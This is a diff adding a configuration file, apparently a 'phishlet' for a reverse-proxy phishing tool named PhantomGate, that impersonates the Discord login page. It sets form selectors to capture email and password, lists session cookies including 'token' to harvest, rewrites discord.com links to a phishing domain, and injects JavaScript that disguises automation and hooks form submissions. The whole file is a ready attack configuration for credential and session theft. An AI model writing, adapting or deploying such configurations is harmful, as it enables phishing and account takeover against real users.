@@ -1,0 +1,69 @@
+name: Discord
+author: PhantomGate
+version: 2.0.0
+description: Discord authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - discord.com
+    - www.discord.com
+    - discordapp.com
+  
+  login:
+    domain: discord.com
+    path: /login
+    username:
+      selector: "input[name='email']"
+      capture: true
+    password:
+      selector: "input[name='password']"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: __dcfduid
+        regex: ".*"
+      - name: __sdcfduid
+        regex: ".*"
+      - name: __cfruid
+        regex: ".*"
+      - name: _csrf
+        regex: ".*"
+      - name: token
+        regex: ".*"
+      - name: redirects
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: discord.com
+      inject: true
+    - domain: www.discord.com
+      inject: true
+    - domain: discordapp.com
+      inject: true
+  
+  sub_filters:
+    - domain: discord.com
+      search: "https://discord.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Discord
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('input[name="email"]');
+        var password = form.querySelector('input[name="password"]');
+        if (username && password) {
+          console.log('[PhantomGate] Discord credentials captured');
+        }
+      }, true);
+    })();
